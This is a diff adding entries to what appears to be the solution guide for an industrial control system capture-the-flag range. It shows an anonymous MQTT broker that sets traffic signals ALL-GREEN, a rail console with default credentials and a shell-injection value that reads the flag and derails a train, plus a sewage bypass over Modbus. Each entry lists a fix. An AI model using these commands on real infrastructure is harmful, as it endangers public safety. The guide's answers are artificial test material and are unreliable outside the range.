@@ -176,3 +176,19 @@ PLC, authenticated protocol, re-assert safe state (the hardened build's
   (`BYPASS_GATE`, coil 3) and/or stop aeration (coil 0) + dosing (coil 1).
   `modbus_attack.py sewage bypass`. `effluent_path` flips to `raw` within a
   few ticks; the river plume then ramps and the swimmers sicken.
+
+### `traffic_mqtt` — (map: signals ALL-GREEN, crashes) — Phase 4
+- The move: the broker at `bus:1883` is anonymous with no ACL.
+  `mosquitto_pub -h bus -t pkt/traffic/1/set -m ALL-GREEN` (or `traffic_attack.py
+  all-green`) locks a crossroads. The flag: `mosquitto_pub -h bus -t
+  pkt/traffic/eng -m 0000` then `mosquitto_sub -h bus -t pkt/traffic/flag -C 1`.
+- Fix: broker ACLs + auth (the segmented build's `acl_file`), signed commands.
+
+### `rail_console` — (map: train derails into the factory, fire) — Phase 4
+- The move: `nc rail-plc 2323`. `login maint maint`, then `flag` for the key,
+  or `set label ; cat /run/secret/rail_console/flag.txt` (the label is
+  concatenated into a shell call). `set switch spur` throws the switch; time it
+  so the train is near the branch (`train_pos` ~0.35-0.42) and it derails.
+  `rail_attack.py flag | inject "<cmd>" | spur`.
+- Fix: drop the console or gate it with auth + an allowlist; never shell out on
+  operator input.
